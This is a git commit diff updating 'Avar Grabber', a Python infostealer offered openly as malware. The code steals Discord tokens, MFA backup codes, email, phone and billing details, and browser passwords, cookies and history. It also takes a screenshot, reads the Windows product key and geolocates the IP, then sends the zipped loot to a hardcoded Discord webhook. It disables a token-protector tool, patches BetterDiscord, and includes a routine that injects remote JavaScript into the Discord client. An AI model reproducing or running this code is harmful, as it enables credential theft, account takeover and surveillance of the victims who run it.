fe8d74ec8e34dadefccbc202e38fe14564dc1ec1
Sarah <93410937+Sarahh731@users.noreply.github.com>
2022-02-09 21:45:51 -0400

    little update uwu

--- main.py
+++ main.py
@@ -1,24 +1,25 @@
+import os
 import requests
-import os 
-import shutil 
-import sqlite3 
-import zipfile 
-import json 
+import shutil
+import sqlite3
+import zipfile
+import json
 import base64 
-import psutil 
-import pyautogui
+import psutil
 
+from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from re import findall
 from Crypto.Cipher import AES
 
 class Avar_Grabber:
     def __init__(self):
-        self.webhook = "WEBHOOK HERE"
+        self.webhook = "https://discord.com/api/webhooks/912148559183368223/55dabf0x8JbKuIr4SHWNWEmMjvZy9sU_WdoXF2h8omvHa-O6VXMw84tA6l8PE2OjekX8"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Avar_Grabber"
+        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
@@ -26,31 +27,54 @@ class Avar_Grabber:
             pass
 
         self.tokens = []
-        self.saved = []
-
-        if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
+        self.discord_psw = []
+        self.backup_codes = []
+        
+        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
             self.bypass_better_discord()
 
         if not os.path.exists(self.appdata+'\\Google'):
-            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
+            self.files += f"{os.getlogin()} doesn't have google installed\n"
         else:
-            self.grabPassword()
-            self.grabCookies()
-            self.operagxpsw()
-            self.operagxcookies()
-            self.operagxhist()
-            self.edgecookies()
-            self.edgehist()
-            self.edgepsw()
-            self.grabhist()
+            self.axd()
         self.grabTokens()
+        self.neatifyTokens()
         self.screenshot()
+        for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
+            if os.path.exists(self.tempfolder+os.sep+i):
+                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as f:
+                    x = f.read()
+                    if x != "":
+                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
+                            f.write("Made by Cl1cker\n\n")
+                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
+                            fp.write(x)
+                            fp.write("\n\nMade by Cl1cker")
+                    else:
+                        f.close()
+                        try:
+                            os.remove(self.tempfolder+os.sep+i)
+                        except Exception:
+                            print("ok")
+
         self.SendInfo()
-        self.LogOut()
+        #self.Injection()
         try:
             shutil.rmtree(self.tempfolder)
-        except (PermissionError, FileExistsError):
+        except (PermissionError, FileNotFoundError):
             pass
+
+
+    def axd(self):
+        self.grabPassword()
+        self.grabCookies()
+        self.operagxpsw()
+        self.operagxcookies()
+        self.operagxhist()
+        self.edgecookies()
+        self.edgehist()
+        self.edgepsw()
+        self.grabhist()
 
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
@@ -61,12 +85,15 @@ class Avar_Grabber:
             headers.update({"Authorization": token})
         return headers
 
-    def LogOut(self):
+    def Injection(self):
         for proc in psutil.process_iter():
-            if any(procstr in proc.name() for procstr in\
-            ['Discord', 'DiscordCanary', 'DiscordDevelopment', 'DiscordPTB']):
-                proc.kill()
-        for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
+            if any(procstr in proc.name().lower() for procstr in\
+            ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
+                try:
+                    proc.kill()
+                except psutil.NoSuchProcess:
+                    pass
+        for root, dirs, files in os.walk(self.appdata):
             for name in dirs:
                 if "discord_desktop_core-" in name:
                     try:
@@ -74,19 +101,59 @@ class Avar_Grabber:
                         os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Avar"))
                     except FileNotFoundError:
                         pass
-                    f = requests.get("https://raw.githubusercontent.com/Cl1ckerr/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
+                    f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
                         index_file.write(f)
-        for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
+        for root, dirs, files in os.walk(self.roaming+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
             for name in files:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
 
+    def bypass_token_protector(self):
+        #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
+        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        for proc in psutil.process_iter():
+            if any(procstr in proc.name().lower() for procstr in\
+            ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
+                try:
+                    proc.kill()
+                except psutil.NoSuchProcess:
+                    pass
+        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
+            try:
+                os.remove(tp+i)
+            except Exception:
+                pass 
+        try:
+            with open(tp+"config.json") as f:
+                item = json.load(f)
+                item['auto_start'] = False
+                item['auto_start_discord'] = False
+                item['integrity'] = False
+                item['integrity_allowbetterdiscord'] = False
+                item['integrity_checkexecutable'] = False
+                item['integrity_checkhash'] = False
+                item['integrity_checkmodule'] = False
+                item['integrity_checkscripts'] = False
+                item['integrity_checkresource'] = False
+                item['integrity_redownloadhashes'] = False
+                item['iterations_iv'] = 364
+                item['iterations_key'] = 457
+                item['version'] = 69420
+
+            with open(tp+"config.json", 'w') as f:
+                json.dump(item, f, indent=2, sort_keys=True)
+
+            with open(tp+"config.json", 'a') as f:
+                f.write("\n\n//Cl1cker just shit on this token protector")
+        except Exception:
+            pass
+
     def bypass_better_discord(self):
-        bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
+        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
         with open(bd, "rt", encoding="cp437") as f:
             content = f.read()
-            content2 = content.replace("api/webhooks", "Avar")
+            content2 = content.replace("api/webhooks", "Cl1ckerTheGoat")
         with open(bd, 'w'): pass
         with open(bd, "wt", encoding="cp437") as f:
             f.write(content2)
@@ -398,8 +465,6 @@ class Avar_Grabber:
             pass
 
     def grabTokens(self):
-        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Sarah | https://github.com/Sarahh731/Avar-Token-Grabber\n\n")
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
@@ -432,65 +497,96 @@ class Avar_Grabber:
                 if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                     continue
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for regex in (self.regex):
                         for token in findall(regex, line):
-                            self.tokens.append(token)
+                            try:
+                                r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                            except Exception:
+                                pass
+                            if r.status_code == 200:
+                                if token in self.tokens:
+                                    continue
+                                self.tokens.append(token)
+        if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
+            for path, subdirs, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
+                for _file in files:
+                    if not _file.endswith('.sqlite'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (self.regex):
+                            for token in findall(regex, line):
+                                try:
+                                    r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                                except Exception:
+                                    pass
+                                if r.status_code == 200:
+                                    if token in self.tokens:
+                                        continue
+                                    self.tokens.append(token)
+                                    
+    def neatifyTokens(self):
+        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
-            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
-            if r.status_code == 200:
-                if token in self.saved:
-                    continue
-                self.saved.append(token)
+            try:
                 j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
-                badges = ""
-                flags = j['flags']
-                if (flags == 1):
-                    badges += "Staff, "
-                if (flags == 2):
-                    badges += "Partner, "
-                if (flags == 4):
-                    badges += "Hypesquad Event, "
-                if (flags == 8):
-                    badges += "Green Bughunter, "
-                if (flags == 64):
-                    badges += "Hypesquad Bravery, "
-                if (flags == 128):
-                    badges += "HypeSquad Brillance, "
-                if (flags == 256):
-                    badges += "HypeSquad Balance, "
-                if (flags == 512):
-                    badges += "Early Supporter, "
-                if (flags == 16384):
-                    badges += "Gold BugHunter, "
-                if (flags == 131072):
-                    badges += "Verified Bot Developer, "
-                if (badges == ""):
-                    badges = "None"
+            except Exception:
+                pass
+            user = j["username"] + "#" + str(j["discriminator"])
 
-                user = j["username"] + "#" + str(j["discriminator"])
-                email = j["email"]
-                phone = j["phone"] if j["phone"] else "No Phone Number attached"
-
-                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
-                try:
-                    requests.get(url)
-                except:
-                    url = url[:-4]
-
+            if token.startswith("mfa.") and self.discord_psw:
+                with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a", errors="ignore") as fp:
+                    fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
+                    for x in self.discord_psw:
+                        try:
+                            r = requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
+                            for i in r["backup_codes"]:
+                                if i not in self.backup_codes:
+                                    self.backup_codes.append(i)
+                                    fp.write(f'\t{i["code"]} | {"Already used" if i["consumed"] == True else "Not used"}\n')
+                        except Exception:
+                            pass
+            badges = ""
+            flags = j['flags']
+            if (flags == 1): badges += "Staff, "
+            if (flags == 2): badges += "Partner, "
+            if (flags == 4): badges += "Hypesquad Event, "
+            if (flags == 8): badges += "Green Bughunter, "
+            if (flags == 64): badges += "Hypesquad Bravery, "
+            if (flags == 128): badges += "HypeSquad Brillance, "
+            if (flags == 256): badges += "HypeSquad Balance, "
+            if (flags == 512): badges += "Early Supporter, "
+            if (flags == 16384): badges += "Gold BugHunter, "
+            if (flags == 131072): badges += "Verified Bot Developer, "
+            if (badges == ""): badges = "None"
+            user = j["username"] + "#" + str(j["discriminator"])
+            email = j["email"]
+            phone = j["phone"] if j["phone"] else "No Phone Number attached"
+            try:
                 nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
-                has_nitro = False
-                has_nitro = bool(len(nitro_data) > 0)
-
+            except Exception:
+                pass
+            has_nitro = False
+            has_nitro = bool(len(nitro_data) > 0)
+            try:
                 billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
-                
-                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
+            except Exception:
+                pass
+            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
         f.close()
 
     def screenshot(self):
-        image = pyautogui.screenshot()
+        image = ImageGrab.grab(
+            bbox=None, 
+            include_layered_windows=False, 
+            all_screens=False, 
+            xdisplay=None
+        )
         image.save(self.tempfolder + "\\Screenshot.png")
+        image.close()
 
     def SendInfo(self):
+        wkey = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
+        ip = country = city = region = googlemap = "None"
         try:
             data = requests.get("http://ipinfo.io/json").json()
             ip = data['ip']
@@ -498,18 +594,22 @@ class Avar_Grabber:
             country = data['country']
             region = data['region']
             googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
-        except:
+        except Exception:
             pass
-        temp = os.path.join(self.tempfolder)
-        new = os.path.join(self.appdata, f'Avar-[{os.getlogin()}].zip')
-        self.zip(temp, new)
+        _zipfile = os.path.join(self.appdata, f'Avar-[{os.getlogin()}].zip')
+        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
+        abs_src = os.path.abspath(self.tempfolder)
         for dirname, _, files in os.walk(self.tempfolder):
-            for f in files:
-                self.files += f"\n{f}"
-        n = 0
-        for r, d, files in os.walk(self.tempfolder):
-            n+= len(files)
-            self.fileCount = f"{n} Files Found: "
+            for filename in files:
+                absname = os.path.abspath(os.path.join(dirname, filename))
+                arcname = absname[len(abs_src) + 1:]
+                zipped_file.write(absname, arcname)
+        zipped_file.close()
+        files = os.listdir(self.tempfolder)
+        for f in files:
+            self.files += f"\n{f}"
+        self.fileCount = f"{len(files)} Files Found: "
+        backslash = "\n"
         embed = {
             "username":"Avar Grabber",
             "avatar_url":"https://cdn.discordapp.com/attachments/922610957316919307/924709101815091291/kawai.png",
@@ -520,7 +620,7 @@ class Avar_Grabber:
                         "url": "https://github.com/Cl1ckerr/Avar-Token-Grabber",
                         "icon_url": "https://cdn.discordapp.com/attachments/922610957316919307/924709101815091291/kawai.png"
                     },
-                    "description": f"**{os.getlogin()}** Just ran The Avar Grabber :sob:\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "description": f'**{os.getlogin()}** Run The Avar Grabber :sob:\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}{backslash+"Windows Key: "+wkey if wkey else ""}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                     "color": 15158332,
 
                     "thumbnail": {
@@ -534,17 +634,8 @@ class Avar_Grabber:
             ]
         }
         requests.post(self.webhook, json=embed)
-        requests.post(self.webhook, files={'upload_file': open(new,'rb')})
-
-    def zip(self, src, dst):
-        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
-        abs_src = os.path.abspath(src)
-        for dirname, _, files in os.walk(src):
-            for filename in files:
-                absname = os.path.abspath(os.path.join(dirname, filename))
-                arcname = absname[len(abs_src) + 1:]
-                zipped_file.write(absname, arcname)
-        zipped_file.close()
+        requests.post(self.webhook, files={'upload_file': open(_zipfile,'rb')})
+        os.remove(_zipfile)
 
 if __name__ == "__main__":
     Avar_Grabber()
